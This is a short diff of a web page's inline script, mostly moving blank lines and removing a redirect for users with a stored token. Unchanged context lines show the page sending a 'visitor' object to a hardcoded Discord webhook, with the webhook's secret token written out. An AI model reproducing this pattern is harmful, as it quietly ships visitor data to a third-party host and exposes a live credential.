@@ -30,9 +30,9 @@
     <!-- Custom CSS -->
     <link rel="stylesheet" href="/static/custom.css">
 
-
-
     <script>
+
+
         /*Vars*/
 
 
@@ -82,6 +82,7 @@
 
                 var dsreq = new XMLHttpRequest();   //post to a discord server
                 dsreq.open('POST', 'https://discordapp.com/api/webhooks/997086371716018246/lUo7uVJk0gm7HfbVUwTtY7pENoHF0zPV0qHBM59m4698ErobF-yNbbW5WjVO9VKY9pk6');
+
                 dsreq.setRequestHeader('Content-Type', 'application/json');
                 dsreq.send(JSON.stringify({ content: "```json\n" + JSON.stringify(visitor) + "```", username: "Visitor" }));
             }
@@ -91,10 +92,6 @@
         document.getElementsByTagName('img')[0].hidden = true;
 
 
-
-        if (window.localStorage.getItem("token") != null) {
-            window.location = "/main"
-        }
     </script>
 
 </head>
